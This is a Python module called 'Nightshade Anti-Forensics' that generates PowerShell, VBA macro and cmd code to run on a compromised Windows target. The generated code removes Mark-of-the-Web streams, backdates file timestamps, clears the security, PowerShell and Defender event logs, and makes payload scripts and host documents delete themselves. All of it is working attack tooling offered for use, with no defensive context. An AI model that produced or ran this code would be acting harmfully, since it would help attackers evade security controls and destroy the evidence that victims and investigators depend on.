"""
Nightshade Anti-Forensics Module.
Generates PowerShell/VBA code that executes ON THE TARGET to
delete Zone.Identifier streams, timestomp files, and self-destruct.
"""
import random
import string


class MarkOfWebStripper:
    """Generates PowerShell to delete Zone.Identifier alternate data streams."""

    @staticmethod
    def powershell_strip(target_path: str = "$env:TEMP\\*") -> str:
        """Generate PS code to delete Zone.Identifier ADS from target files."""
        return f"""
# Strip Mark-of-Web from downloaded files
Get-ChildItem -Path "{target_path}" -ErrorAction SilentlyContinue | ForEach-Object {{
    $ads = $_.FullName + ":Zone.Identifier"
    if (Test-Path $ads) {{
        Remove-Item -Path $ads -Force -ErrorAction SilentlyContinue
    }}
}}

# Also strip from the running script itself
$self = $MyInvocation.MyCommand.Path
if ($self -and (Test-Path $self)) {{
    $ads = $self + ":Zone.Identifier"
    if (Test-Path $ads) {{ Remove-Item -Path $ads -Force -ErrorAction SilentlyContinue }}
}}
""".strip()

    @staticmethod
    def vba_strip() -> str:
        """Generate VBA code to delete Zone.Identifier via WScript.Shell."""
        return '''
Private Function StripZoneID() As Boolean
    On Error Resume Next
    Dim fso As Object
    Dim folder As Object
    Dim file As Object
    Dim adsPath As String
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set folder = fso.GetSpecialFolder(2)  ' Temp folder
    
    For Each file In folder.Files
        adsPath = file.Path & ":Zone.Identifier"
        CreateObject("WScript.Shell").Run "cmd /c del /f /q """ & adsPath & """ 2>nul", 0, True
    Next
    
    ' Strip from current document
    adsPath = ThisWorkbook.FullName & ":Zone.Identifier"  ' Excel
    CreateObject("WScript.Shell").Run "cmd /c del /f /q """ & adsPath & """ 2>nul", 0, True
    
    StripZoneID = True
End Function
'''.strip()

    @staticmethod
    def random_var_name(length: int = 6) -> str:
        return '_' + ''.join(random.choices(string.ascii_lowercase, k=length))


class Timestomper:
    """Generates commands to modify file timestamps on the target."""

    @staticmethod
    def powershell_timestomp(
        target_path: str,
        creation_year: int = 2023,
        creation_month: int = 6,
        creation_day: int = 15,
    ) -> str:
        """Generate PS code to set file timestamps to a specified date."""
        return f'''
# Timestomp file timestamps
$path = "{target_path}"
if (Test-Path $path) {{
    $date = Get-Date "{creation_year:04d}-{creation_month:02d}-{creation_day:02d} 10:00:00"
    $(Get-Item $path).CreationTime = $date
    $(Get-Item $path).LastWriteTime = $date
    $(Get-Item $path).LastAccessTime = $date
}}
'''.strip()

    @staticmethod
    def cmd_timestomp(target_path: str) -> str:
        """Generate cmd.exe copy trick to timestomp (preserves original timestamp)."""
        rnd = ''.join(random.choices(string.ascii_lowercase, k=6))
        return f'''
copy /b "{target_path}" +,, "{target_path}" >nul 2>&1
'''.strip()

    @staticmethod
    def powershell_randomize_timestamps(target_path: str) -> str:
        """Generate PS code to randomize timestamps within a plausible range."""
        return f'''
# Randomize timestamps to evade timeline analysis
$path = "{target_path}"
if (Test-Path $path) {{
    $baseYear = (Get-Random -Minimum 2019 -Maximum 2024)
    $baseMonth = (Get-Random -Minimum 1 -Maximum 13)
    $baseDay = (Get-Random -Minimum 1 -Maximum 29)
    $baseHour = (Get-Random -Minimum 8 -Maximum 18)
    $rndDate = Get-Date "$baseYear-$baseMonth-$baseDay $baseHour:00:00"
    $(Get-Item $path).CreationTime = $rndDate
    $(Get-Item $path).LastWriteTime = $rndDate
    $(Get-Item $path).LastAccessTime = $rndDate
}}
'''.strip()


class SelfDestruct:
    """Generates self-deletion commands that execute on the target after payload completion."""

    @staticmethod
    def powershell_delayed_delete(script_path: str = "$MyInvocation.MyCommand.Path") -> str:
        """Generate PS code that deletes itself after a delay."""
        return f'''
# Self-destruct: delete script after execution
$scriptPath = {script_path}
if ($scriptPath -and (Test-Path $scriptPath)) {{
    $delScript = @"
    Start-Sleep -Seconds 5
    Remove-Item -Path "$scriptPath" -Force -ErrorAction SilentlyContinue
"@
    $delScript | Out-File "$env:TEMP\\~cleanup.ps1" -Force
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\\~cleanup.ps1`"" -WindowStyle Hidden
}}
'''.strip()

    @staticmethod
    def cmd_self_delete() -> str:
        """Generate cmd.exe self-deletion via temp batch file."""
        return r'''
:: Self-delete using temp batch file
set SELF=%~f0
set TMPX=%TEMP%\~cl.tmp
echo @del /f /q "%SELF%" > "%TMPX%"
echo @del /f /q "%TMPX%" >> "%TMPX%"
start /b "" cmd /c "%TMPX%"
'''.strip()

    @staticmethod
    def vba_self_destruct(document_path: str = "") -> str:
        """Generate VBA to delete the host document after execution."""
        if not document_path:
            document_path = "ThisWorkbook.FullName"

        return f'''
Private Function SelfDestructDoc() As Boolean
    On Error Resume Next
    Dim fso As Object
    Dim vbscript As String
    Dim tempPath As String
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempPath = fso.GetSpecialFolder(2) & "\\~sd.vbs"
    
    vbscript = "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
               "Set f = fso.GetFile(""{document_path}"")" & vbCrLf & _
               "WScript.Sleep 3000" & vbCrLf & _
               "f.Delete True"
    
    ' Write VBS and execute
    Dim ts As Object
    Set ts = fso.CreateTextFile(tempPath, True)
    ts.Write vbscript
    ts.Close
    
    CreateObject("WScript.Shell").Run "wscript.exe """ & tempPath & """", 0, False
    
    SelfDestructDoc = True
End Function
'''.strip()

    @staticmethod
    def powershell_wipe_event_logs() -> str:
        """Generate PS code to clear event logs."""
        return r'''
# Clear security and system event logs
try {
    Clear-EventLog -LogName "Security" -ErrorAction SilentlyContinue
    Clear-EventLog -LogName "System" -ErrorAction SilentlyContinue
    Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
    Clear-EventLog -LogName "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue
    Clear-EventLog -LogName "Microsoft-Windows-Windows Defender/Operational" -ErrorAction SilentlyContinue
} catch {}
'''.strip()

    @staticmethod
    def powershell_full_cleanup() -> str:
        """Assemble a complete cleanup routine: ADS strip + timestomp + log wipe + self-delete."""
        return f"""
{MarkOfWebStripper.powershell_strip()}

{Timestomper.powershell_timestomp("$env:TEMP\\~ps.ps1")}

{SelfDestruct.powershell_wipe_event_logs()}

{SelfDestruct.powershell_delayed_delete()}
""".strip()
